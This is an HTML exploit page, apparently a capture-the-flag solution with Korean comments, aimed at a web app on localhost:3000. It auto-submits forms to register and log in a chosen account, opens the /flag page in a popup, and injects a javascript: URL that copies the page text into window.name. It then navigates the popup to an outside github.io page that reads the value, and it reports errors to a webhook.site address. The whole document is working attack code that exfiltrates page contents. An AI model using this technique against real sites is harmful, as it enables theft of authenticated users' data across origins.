<!DOCTYPE html>
<html>
<body>
<form id="regForm" method="POST" action="http://localhost:3000/register" target="popup">
  <input name="username" value="wname1">
  <input name="password" value="wname1">
</form>

<form id="loginForm" method="POST" action="http://localhost:3000/login" target="popup">
  <input name="username" value="wname1">
  <input name="password" value="wname1">
</form>

<form id="flagForm" method="GET" action="http://localhost:3000/flag" target="popup">
</form>

<script>
var popup = window.open('about:blank', 'popup');

document.getElementById('regForm').submit();

setTimeout(function(){
  document.getElementById('loginForm').submit();
}, 200);

setTimeout(function(){
  document.getElementById('flagForm').submit();
}, 400);

// flag 페이지 로드 후, javascript:로 window.name에 flag 저장
setTimeout(function(){
  try {
    popup.location = "javascript:window.name=document.body.innerText";
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err1=' + encodeURIComponent(e.message);
  }
}, 600);

// 그 다음 우리 페이지로 돌아오면 window.name 읽기 가능
setTimeout(function(){
  try {
    popup.location = 'https://kiranshownny.github.io/webtest/read.html';
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err2=' + encodeURIComponent(e.message);
  }
}, 750);
</script>
</body>
</html>
